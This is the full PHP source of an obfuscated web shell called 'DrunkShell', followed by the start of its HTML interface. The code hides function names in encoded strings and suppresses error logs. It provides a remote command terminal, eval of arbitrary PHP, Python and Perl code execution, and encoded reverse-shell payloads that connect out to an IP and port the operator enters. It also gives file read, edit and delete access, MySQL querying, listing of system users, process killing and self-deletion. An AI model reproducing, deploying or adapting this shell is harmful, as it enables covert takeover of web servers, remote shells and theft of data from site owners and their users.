<?php
/*
	DrunkShell v 1.0.0
	(c) s4ndal.py
*/
@ob_start();
@session_start();
@set_time_limit(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@error_reporting(0);
@ini_set('display_errors', FALSE);
header("X-XSS-Protection: 0");
$auth = "f36915a783ca4a4a3f70a616d69218b2ae81df5208fca1119a11bffb4870cd83";
$f_______un=[
  "5a64453741546b6e5a6453374e544f705a6157375a573d3d",########################################################### //baseename( $WKWK[0](
  "5a645336594a4f385a64413d", // exeec( $WKWK[1](
  "5a6e4137594a4f385a6141374f6e52615a645336594a4f385a64413d", // shell__exec( $WKWK[2](
  "5a6e413659546b6e5a6e57375a544e63", // sysstem( $WKWK[3](
  "5a6e4d3741546b6e5a6e41365a4a4f355a6e45365a573d3d", // passsthru( $WKWK[4](
  "5a6e53374e544e645a6463374e544e65", // unliink( $WKWK[5](
  "5a6e45374e4a4f395a64633641673d3d", // rmdiir( $WKWK[6](
  "5a644137594a4e635a614f375a4d3d3d", // chmood( $WKWK[7](
  "5a6e4137416e4f705a6153375a4a4f345a6e453d", // scandirr( $WKWK[8](
  "5a644137594a4f395a64633641673d3d", // chdiir( $WKWK[9](
  "5a644f3759544e645a6453384e646b715a6e53365a4a52615a6441374e644e625a6e57375a544e625a6e573641713d3d", // file_put__contents( $WKWK[10](
  "5a646b375a546b395a6441365a6e4f39", // getccwd( $WKWK[11](
  "5a644f374e646b715a6453374e573d3d", // foopen( $WKWK[12](
  "5a644f365a6e6b6f5a6463365a4a4f38", // fwrrite( $WKWK[13](
  "5a644f37416e4e645a614f36416e4f38", // fcloose( $WKWK[14](
  "5a6e413659546b6e5a514f375a6e4f385a6e57384e646b395a6453374e4a6b715a514f375a4a4f345a6e453d", // sys__get_temp_dir( $WKWK[15](
  "5a6e45375a544f705a6457375a644f345a6141375a573d3d", // readdfile( $WKWK[16](
  "5a644f3759544e645a645336414a4f385a6e45374e4a6b6e", // fileperrms( $WKWK[17](
  "5a6e4d3641644f385a646b384e644e635a6449365a4a4f6e5a64673d", // preg__match( $WKWK[18](
  "5a6e41365a4a6b6f5a514f3641644f385a6e4d374f6e4f705a6441375a573d3d", // str__replace( $WKWK[19](
  "5a614936416e4e615a6153384e644f385a615337416e4e615a6457375a573d3d", // json__encode( $WKWK[20](
  "5a64453741546b6e5a64536e5a6441395a514f375a544e625a6441374e644f395a64533d", // base64_encode( $WKWK[21](
  "5a64453741546b6e5a64536e5a6441395a514f375a4a4f385a6441374e644f395a64533d", // base64_decode( $WKWK[22](
  "5a644f3759544e645a6453384e644f365a6453365a4a52615a6441374e644e625a6e57375a544e625a6e573641713d3d", // file_get__contents( $WKWK[23](
  "5a6e41365a4a6b6f5a6e573641673d3d", // strtr( $WKWK[24](
  "5a6e41365a4a6b6f5a514f3641644e615a6e576e4154416e", // str_rot13( $WKWK[25](
  "5a646b364f544f345a6153375a644e645a6449365a4a4f38", // gzinflate( $WKWK[26](
  "5a6e41365a4a6b6f5a6e4d374e646b6e", // strposs( $WKWK[27](
  "5a646336416e52615a64573759546b6f", // is__dir( $WKWK[28](
  "5a646336416e52615a644f3759544e645a64533d", // is__file( $WKWK[29](
  "5a6e41365a4a6b6f5a6141375a544e62", // strleen( $WKWK[30](
  "5a6e4d374e646b36", // poow( $WKWK[31](
  "5a6e49365a544f385a6e453659573d3d", // quuery( $WKWK[32](
  "5a6e4d3641644f385a646b384e646b6e5a6e4d374f6e4f345a6e573d", // preg__split( $WKWK[33](
  "5a644f36416e4e615a6441374f644e615a6e4d375a544e62", // fsoockopen( $WKWK[34](
  "5a6e4d374e646b6e5a646336594a52615a646b375a546b395a646b3641644f365a6463375a4d3d3d", // posix__getgrgid( $WKWK[35](
  "5a6e4d374e646b6e5a646336594a52615a646b375a546b395a6e4d365a6e6b385a6463375a4d3d3d", // posix__getpwuid( $WKWK[36](
  "5a6e4d3641644f385a646b384e646b6f5a645336414a4e645a644937416e4f38", // preg__replace( $WKWK[37](
  "5a644f3759544e645a6453374e646b365a6153375a546b6f", // fileeowner( $WKWK[38](
  "5a61573659546b6e5a6e49374f6e4f34", // mysqloi( $WKWK[39](
  "5a6157374f644f395a64633641673d3d", //mkdir( $WKWK[40](
  "5a644f3759544e645a6453384e644f385a6e673759546b6e5a6e573641713d3d", // file__exists( $WKWK[41](
  "5a6e45375a544e625a6449374e4a4f38", // reename( $WKWK[42](
  "5a6441374e646b715a6e633d", // coopy( $WKWK[43](
  "5a6157375a4a4138", // mdd5( $WKWK[44](
  "5a64673741546b6e5a64673d", // haash( $WKWK[45](
  "5a6e4d374e646b715a6453374e573d3d", // poopen( $WKWK[46](
  "5a6e4d37416e4e645a614f36416e4f38", // pcloose( $WKWK[47](
  "5a644f375a544e615a644f3d", // feeof( $WKWK[48](
  "5a644f3641644f385a6449375a4d3d3d", // freead( $WKWK[49](
  "5a644f3759544e645a6453374e4a6b395a6463374e4a4f38", // fileemtime( $WKWK[50](
  "5a64573741546b395a64533d", // daate( $WKWK[51](
  "5a646336416e52615a6e45375a544f705a64573741544f6f5a6141375a573d3d", // is__readable( $WKWK[52](
  "5a646336416e52615a6e6b3641644f345a6e573741544f6f5a6141375a573d3d", // is__writable( $WKWK[53](
  "5a6e4d37594a6b715a514f365a544e625a6449374e4a4f38", // php__uname( $WKWK[54](
  "5a6463374e544f345a514f375a6e4f385a6e573d", // ini__get( $WKWK[55](
  "5a644f3759544e645a6453375a6e6b6f5a614f365a546b71", // fileegroup( $WKWK[56](
  "5a64573759546b6f5a61533741544e635a64533d", // dirname( $WKWK[57](
  "5a6e57374e646b385a644137594d3d3d", // touch( $WKWK[58](
  "5a64573759546b6e5a6145384e644f375a6e45375a544f385a514f36416e6b715a644937416e4f38", // $WKWK[59]( $WKWK[59](
  "5a64573759546b6e5a6145384e646b395a614f365a4a4f705a6141384e646b6e5a6e4d3741544f6e5a64533d", // disk_total_space( $WKWK[60](
  "5a644f3759544e645a645336416e4f345a3749375a573d3d", // filesize( $WKWK[61](
  "5a64673741546b6e5a6467384e644f355a61573741544f6e5a514f3741544e645a646b374e646b6e", // $WKWK[62]( $WKWK[62](
  ];
if(!empty($_SESSION["mysql"]["server"]) && !empty($_SESSION["mysql"]["username"])){
  $conn=new mysqli($_SESSION["mysql"]["server"], $_SESSION["mysql"]["username"], $_SESSION["mysql"]["pwd"], $_SESSION["mysql"]["database"]);
}
////////   0    1    2    3    4    5    6    7    8     9    10   11  12    13   14   15    16   17
$ABC = ["a", "s", "u", "t", "e", "l", "o", "r", "3" , "o", "1", "_", "6" , "b", "d", "4", "c", "n"];
$ST13 = $ABC[1].$ABC[3].$ABC[7].$ABC[11].$ABC[7].$ABC[9].$ABC[3].$ABC[10].$ABC[8];
$STr = $ABC[1].$ABC[3].$ABC[7].$ABC[3].$ABC[7];
$BDEC = $ABC[13].$ABC[0].$ABC[1].$ABC[4].$ABC[12].$ABC[15].$ABC[11].$ABC[14].$ABC[4].$ABC[16].$ABC[9].$ABC[14].$ABC[4];
$BENC = $ABC[13].$ABC[0].$ABC[1].$ABC[4].$ABC[12].$ABC[15].$ABC[11].$ABC[4].$ABC[17].$ABC[16].$ABC[9].$ABC[14].$ABC[4];
$WKWK[] = "";
foreach($f_______un as $x => $xx){
  $WKWK[$x] = nhx(Dex($xx));
}
$at = (isset($_GET["x"])) ? Dex($_GET["x"]) : $WKWK[19]("\\", "/", $WKWK[11]()) . "/";
$rn = $WKWK[33]("/\\\|\//", $at);
$code = [
  "python" => "6d5138716c36443945465a724f3774626a4b706e6a5144716b6130644e505a6e4247306e42465a346b71786e58505a724f3774626a4b346e6c375a764e5057796b3730646d3752394263484750396259565257756b3730646d37523942625a5857397468533856555653485a4357786e42615a726c6134624f36577943465a346b6f34666b616a37516e486a424762736a4b666e695041734f50447a6a62756f50556378435778726b6f34636a504d6f434641734e6162754e513472434b6375414b63436c3641734e4652714165666e42614e786c4752736c6f6778424a49784b61306e426156386b4a45796b6f34616d5170626c6131794355716f435778786c504c726b7a57676b4656344b7a4c396955346e6b4748366c656765423744786c6530654f505a794565633d",
  "perl" => "456f49726a505a6f423744786c6530714e504475454b38364b7a526e4e554c546c375a764e5057324b6556785855564c53636a51516e4c6a597179636b4a39635752444652627570505475436b3730646d3752394348417553494e6855533448524b705454395a4250385a535363524c5455707a4e5056716b6130396c3744346c6148744e5567656a475a7145656378597178784e6566646c3734734e515a39434841756b3730646d3748634e4644686d51357944464d756d5134626a4830666a473073434b567843556378435074726b47527343485a5356496259424b452b44624165435475436c364c626c656654524956585252577545643561536f4578597178726b47527343485a53564952555365716558654e54456563324b6152354e514179456530656d5135726b37676742516365435475436854753d",
  "php" => "6b375239503656786c5152686c4762746d505779414b633244475a796a51347650365a786961533041545771414a75636a3644786a4752684f5438736a517075596f56626b7a44726b623066585134386c47713244465a794e51707558556a386c6148744e554d744f5475676a6e75676d515732454b30656d5135726b3767674251637a596f56634f5152746c373530414a75634e4752656a516b30414a74784e6566616a5134646a4762726c6230626947626e6a46417944364c646c7a567550374e726b61757a4355623244464c784e4a38714f3734396c4830616c364476434b63326d514f7944464c784e4a393042544978693752356d5057794155633268516261434b56716d515778693752356d505779414b63326851626143464c726b37623550365a626a465a784e4b677858543974415562324e5066786a4b677043547430444756664e5138726c643970593638646d4756786b656765426f4578593652744f505a76434a4d78596f566e6c375a7658514e6e6c375a766c364c626c6567636d504d7544464c726b7a57754447526f6b613472424b56626b7a446e6a464575416e4d7859376261434b49636b3730646d6f62324e5066786a4b677043547430444756626b375a6f6d504c396c36446e6b4752645851486f6b614834434a4d305861486f6b614834434b44716d504c62456571656b654578424a49305861486f6b614834434b44716d504c62456571656a6f4578424a45305861486f6b614834434b44716d504c62456571656a6f4578435475636b4644724f37526e6b6e38716b613064503730714e51357944465a794e517075424b56634e505a646b6162716a47306f6b364c624f6f71636b4762714e50417859376261434b48786b38306f4e505a726a5044644e5567636b4644724f37526e6b6f6378693752356d5057794155633268505a396b6152666c52306e4e5056684f6170724f3774786c616b7944464c786b47526e516e4c6a424a4d7859365a396b6152666c52306e4e5056684f6170724f3774786c616b7944464c786b47526e516e486a424a4d7859365a396b6152666c52306e4e5056684f6170724f3774786c616b7944464c786b47526e516e446a424a4d7859365a396b6152666c52306e4e5056684f6170724f3774786c616b7944465a724f377575414b63326a3766786c475379415562326d514f794e6152724e6567636b3730646d6f63786937446f4e514876593638784e6566614e513061434b56716d504c626b387570505563786937446f4e514876593639636b6152664e4830665851486f6b614834434b566e6c375a76424b56716d504c626b387570505571636b4762714e505a6c41623978596f56736a5138684f3766666c616a624e48306e6c375a764e50566e58505a396b6152666c52306e4e5170624f365779444644624f5156684f5571636a3644786a4752684f5571634e50446f6c3644684f5570736a517075435474784e6566786c6230666b7a4466695567636b3730646d6f71636b6152664e48306643556232444762736b46523958514e6f4e514863434b566e6c375a76424b56646d4652736d38306e6d507862435474616a3644786a47537944464c786b47526e516e4c6a424b56786c7a4c386a4b633268516261434762735037486f6b614834434b56716d504c626b387570505571636b6152664e48306643556232444762736b46523958514e6f4e514863434b56716d504c626b387570505571634f3766386c6174686b3762334e5563324e7a6a6f6d505662434b566e6c375a76424b56786c7a4c386a4b633268516261434762735037486f6b614834434b56716d504c626b38756f505571636b6152664e48306643556232444762736b46523958514e6f4e514863434b56716d504c626b38756f505571634f3766386c6174686b3762334e5563324e7a6a6f6d505662434b566e6c375a76424b56786c7a4c386a4b6332685038614f3770726b37537944465a724f37757859374e646c47306e4e5567636b4762714e505a6c4148397859374e646c47306e4e5567636b4762714e505a6c4152397859374e646c47306e4e5567636b4762714e505a6c4162397859364c6f6c375a684f3770726b37537944464c6f6c375a626b36417859713d3d",
];
function hx($x){
    $h = '';
    for ($i=0; $i<strlen($x); $i++){
        $ord = ord($x[$i]);
        $hc = dechex($ord);
        $h .= substr('0'.$hc, -2);
    }
    return $h;
}
function Sentuh($x,$y){
  $t = strtotime($y);
  return $WKWK[58]($x, $t);
}
function CheckDrives(){
  global $rn;
  $ret = "";
  if(IsWin()){
    foreach (range('A', 'Z') as $drive){
      if(is_dir($drive.':')){
        if($rn[0] == $drive.':'){
          $ret .= "<a style='color:white!important' class='bor' href='?x=".Enx($drive.':/')."'>".$drive."</a>";
        }else{
          $ret .= "<a class='bor' href='?x=".Enx($drive.':/')."'>".$drive."</a>";
        }
      }
    }
  }else{
    $ret = "This is Linux Lmao";
  }
  return $ret;
}
function nhx($x){
    $h = strToUpper($x);
    $y='';
    for ($i=0; $i < strlen($h)-1; $i+=2){
        $y .= chr(hexdec($h[$i].$h[$i+1]));
    }
    return $y;
}
function AllHash($y,$x){
  global $WKWK;
  return $WKWK[45]($y, $x, false);
}
function GetUsers(){
	if(IsWin()){
		return Xute("net user");
	}else{
		return Xute("getent passwd {1000..60000}");
	}
}
function Size($x){
    $i = abs($x) ? floor(log($x) / log(1024)) : 0;
    $sizes = array('B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
    return sprintf('%.02F', $x / pow(1024, $i)) * 1 . ' ' . $sizes[$i];

}
function Enc($x, $z  = "ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/"){
    global $BENC, $STr;
    $y = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    $o = $STr($BENC($x), $y, $z);
    return $o;
}
function Kill($x){
	if(IsWin()){
		return Xute('tskill '.$x);
	}else{
		return Xute('kill '.$x);
	}
}
function Read($x){
  global $WKWK;
  $y = $WKWK[12]($x,'r');
  $yz = "";
  if($y)
  {
  	while(!$WKWK[48]($y))
  	{
  		$yz .= htmlentities($WKWK[49]($y,(1024*4)));
  	}
    $WKWK[14]($y);
    return $yz;
  }else{
    if(IsWin()){
      $y = Xute("type ".$x);
    }else{
      $y = Xute("cat ".$x);
    }
    return htmlentities($y);
  }
}
function Dec($x, $y  = 'ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/'){
    global $BDEC, $STr;
    $z = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    $o = $BDEC($STr($x, $z, $y));
    return $o;
}
function Enx($x){
  global $ABC, $ST13;
  return hx($ST13(Enc($x)));
}
function Dex($x){
  global $ABC, $ST13;
  return Dec($ST13(nhx($x)));
}
function CopyFile($x, $y){
  global $WKWK;
  $x = $WKWK[19]("\\", "/", $x);
  $y = $y."/".$WKWK[0]($x);
  $contain = $WKWK[8]($x);
  if($WKWK[28]($x)){
    @$WKWK[40]($y);
    foreach($contain as $key => $file){
        $p = $x."/".$file;
        $t = $y."/".$file;
        if ($WKWK[28]($p)) {
          if($file == "." || $file == ".."){
            continue;
          }
          CopyFile($p, $t);
        }else{
          $WKWK[43]($p, $t);
        }
    }
  }else{
    $WKWK[43]($x, $y);
  }

}
function Terminal($x, $y)
{
  global $WKWK;
  $output = "";
  $x = $WKWK[19]("awkawk#$!kwowkoako&^%@#@#$%%%!@akusukakamuhehehe>", "",$x);
  $x = $x." 2>&1";
  if ($WKWK[18]("/^\s*cd\s+(.+) 2>&1\s*$/", $x))
  {
      $WKWK[9]($y);
      $WKWK[18]("/^\s*cd\s+(.+) 2>&1\s*$/", $x, $dir);
      $WKWK[9]($dir[1]);
  }
  else
  {
    $WKWK[9]($y);
    $output = htmlentities(Xute($x));
  }
  return array("path" => $WKWK[11](), "output" => $output);
}
function path()
{
  global $WKWK;
  return array('path' => $WKWK[11]());
}
function AjaxDec($x){
  global $WKWK;
  return nhx(base64_decode($x));
}
function Epal($x)
{
  try {

    global $WKWK;#####
    ob_start();############
    $r = eval($x);#########
    $r = ob_get_contents();
    ob_end_clean();########
    return $r;#############

  } catch (ParseError $e) {

      return false;

  }
}
function IsWin(){
  global $WKWK;
  return $WKWK[27](PHP_OS, 'WIN') !== false;
}
function Bc($ip, $port, $lang)
{
    global $WKWK, $code;#
    $lang = strtolower($lang);
    $arg=$ip." ".$port;#######
    $cod=Dex($code[$lang]);###

    if($lang == "php"){

      $arg="";##################################
      $cod='$ip="'.$ip.'";$port='.$port.';'.$cod;

    }
    if(!RunCode($arg, $cod, $lang)) return false;
}
function RunCode($argument, $code, $lang){
  global $WKWK;
  $lang=strtolower($lang);
  $ext = "";
  switch ($lang) {
    case 'python':
      $ext = "py";
      break;
    case 'perl':
      $ext = "pl";
      break;
    case 'php':
      $ext = "php";
      break;
    default:
      return false;
      break;
  }
  if($lang == "php"){
    if(Epal($code)){
      return Epal($code);
    }else{
      return false;
    }
  }else{
    $filepath = $WKWK[15]()."/"."runcode.".$ext;
    if($WKWK[10]($filepath, $code)){
      $argCrafted = $lang." ".$WKWK[15]()."/"."runcode.".$ext." ".$argument;
      $o = Xute($argCrafted);
      return $o;
      if(!$o){
        return false;
      }
    }else{
      return false;
    }
    $WKWK[5]($filepath);
  }
}
function Search($path, $filename){
  global $WKWK;
  $path = $WKWK[19]("\\", "/", $path);
  $contain = $WKWK[8]($path);
  $file_html = "";
  foreach($contain as $key => $file){
      $p = realpath($path.DIRECTORY_SEPARATOR.$file);
      if ($WKWK[28]($p)) {
        if($file == "." || $file == ".."){
          continue;
        }
        Search($p, $filename);
      }else{
        if($WKWK[27]($file, $filename) !== false){
          $fp = "?x=" . Enx($path) . "&y=" . Enx($file);
          $pf = $path. $file;
          $file_html .= "
          <tr>
          <td>
			  <input class='checkboxDark' type=\"checkbox\" name=\"path_dir[]\" value=\"" . htmlspecialchars($path . "/" . $file) . "\">
		  </td>
		  <td>
			  <a href='".$fp."&act=read'><b>$file</b><br>$p</a>
		  </td>
		  <td>
			  <a href='".$fp."&act=read'><b>$file</b><br>$p</a>
		  </td>
			  <td>".Size($WKWK[61]($pf))."</td>
          <td>
		  </td>
			  <td>".lastmod($p)."</td>
          <td>
            <a>".PermColor($path . $file)."</a>
          </td>
          <td>
            ".OG($path  . $file )."
          </td>
          <td>
            <form method='post'>
            <select name='file_action' class='selectAct'>
              <option data-param='goto' value='".$fp."&act=rename'>rename</option>
              <option data-param='goto' value='".$fp."&act=chmod'>chmod</option>
              <option data-param='goto' value='".$fp."&act=edit'>edit</option>
              <option data-param='delete' value='".$fp."&act=del' data-filename=\"".$file."\">delete</option>
              <option data-param='download' value='" .$pf  . "'>download</option>
              <option data-param='goto' value='".$fp."&act=touch'>touch</option>
              <option data-param='copy' value='" . $pf . "'>copy</option>
              <option data-param='move' value='" . $pf . "'>move</option>
            </select>
            <button type='submit' class='actSubmit'>>></button>
            </form>
          </td>
          </tr>
          ";
        }
      }
      if($key == count($contain) - 1){
        if(empty($file_html)){
          return "Not Found :(";
        }else{
          return $file_html;
        }
      }
  }
}
if (isset($_SESSION["__token"])){
  if (isset($_GET["sad"])) {
    switch ($_GET["sad"]){
      case 'deleteme':
        session_destroy();
        $WKWK[5]($_SERVER["SCRIPT_FILENAME"]);
      break;
      case 'out':
        session_destroy();
        header("Location:".$_SERVER["PHP_SELF"]);
      break;
    }
  }
  if (isset($_GET["api"]))
  {
    if($_GET["api"] !== "dwnld"){
      header('Content-Type: application/json');
    }
    switch ($_GET["api"]) {
      case 'hash':
        $x = $_POST["x"];
        $y = $_POST["y"];
        echo $WKWK[20](
          array(
            "algo" => $y,
            "result" => AllHash($y, $x)
          )
        );
      break;
      case 'dwnld':
        $filePath = AjaxDec($_POST["fullpath"]);
        header("Cache-Control: public");
        header("Content-Description: File Transfer");
        header("Content-Disposition: attachment; filename=".$WKWK[0]($filePath));
        header("Content-Transfer-Encoding: binary");
        $WKWK[16]($filePath);
        break;
      case 'edit':
        if(isset($_POST["path"]) && isset($_POST["content"])){
          if(!write(AjaxDec($_POST["path"]), AjaxDec($_POST["content"]))) die($WKWK[20](array('msg' => "Failed")));
          echo $WKWK[20](array('msg' => "Done"));
        }
      break;
        case 'path':
          echo $WKWK[20](path());
          break;
        case 'mysql':
          $q = AjaxDec($_POST["query"]);
          $res = $conn->query($q);
          $resType = $conn->query($q);
          $colname=array();
          $html = "";
          $raw = array();
          $aff = $conn->affected_rows;
          $type = array(
              1=>'tinyint',
              2=>'smallint',
              3=>'int',
              4=>'float',
              5=>'double',
              7=>'timestamp',
              8=>'bigint',
              9=>'mediumint',
              10=>'date',
              11=>'time',
              12=>'datetime',
              13=>'year',
              16=>'bit',
              253=>'varchar',
              254=>'char',
              246=>'decimal'
          );
          if($aff > 0){
            $html .= "<table class='data_table'>";
            $html .= "<tr>";
            $html .= "<th>Name</th><th>Max Length</th><th>Type</th>";
            $html .= "</tr>";
            while ($row_type = $resType -> fetch_field()) {
              $html .= "<tr>";
              $html .= "<td>".$row_type -> name."</td>";
              $html .= "<td>".$row_type -> max_length."</td>";
              $html .= "<td>".$type[$row_type -> type]."</td>";
              $html .= "</tr>";
            }
            $html .= "</table>";
            $html .= "<table class='data_table'>";
            $html .= "<tr>";
            while ($row = $res -> fetch_field()) {
              $html .= "<th>".$row -> name."</th>";
              $colname[] = $row -> name;
            }
            $html .= "</tr>";
            while ($rows = $res -> fetch_assoc()) {
              $raw[] = $rows;
              $html .= "<tr>";
              foreach ($colname as $key => $value) {
                $html .= "<td>".$rows[$value]."</td>";
              }
              $html .= "</tr>";
            }
            $html .= "</table>";
          }
          if ($aff < 0) {
            $warning = "No rows were affected";
          }else{
            $warning = "Affected rows : ".$conn->affected_rows;
          }
          $return = array('msg' => $warning, 'html' => $html, "raw" => array("colname" => $colname, "rawdata" => $raw));
          echo $WKWK[20]($return);
          break;
        case 'terminal':
          echo $WKWK[20](Terminal(AjaxDec($_POST["cmd"]),AjaxDec($_POST["path"])));
          break;
        case 'execode':
          $o = Runcode("",AjaxDec($_POST["code"]),AjaxDec($_POST["lang"]));
          if(!$o) die($WKWK[20](array("output" => "Something Wrong :(")));
          echo $WKWK[20](array("output" => $o));
          break;
        case 'search':
          $h = "
          <table cellspacing=0 class='fileanddir'>
		  <tr class='atas'>
		  <th></th>
		  <th class='filename'>Name</th>
		  <th>Size</th>
		  <th>Lastmod</th>
		  <th>Perm</th>
		  <th>Owner:Group</th>
		  <th>Action</th>
		  </tr>".
            Search(AjaxDec($_POST["path"]), AjaxDec($_POST["searchfile"])).
          "</table>";
          echo $WKWK[20](array("data" => $h));
          break;
        case 'bc':
          if (isset($_POST["ipport"]))
          {
              $ip_port = $WKWK[33]("/:/", AjaxDec($_POST["ipport"]));
              $ip = $ip_port[0];
              $port = $ip_port[1];
              if (!empty($ip) && !empty($port)){
                  if(!Bc($ip, $port, AjaxDec($_POST["lang"]))) die($WKWK[20](array("msg" => text("Something Wrong!?", "fail"))));
                  echo $WKWK[20](array("msg" => text("OK!", "success")));
              }else{
                  echo $WKWK[20](array("msg" => text("Invalid Format", "fail")));
              }
          }
          break;
      default:
        echo $WKWK[20](array("CARI APA BAGN" => "CARI APA BAGN"));
        break;
    }
    die();
  }
}
$WKWK[9]($at);
?>

<!DOCTYPE html>
<html dir="auto" lang="en-US">
  <head>
    <meta charset="UTF-8">
    <meta name="robots" content="NOINDEX, NOFOLLOW">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js">
    </script>
    <title>DRUNK SHELL BETA </title>
  </head>
  <style>
    @font-face {
    	font-family:'ubuntumono';
    	src:url(data:application/x-font-woff;charset=utf-8;base64,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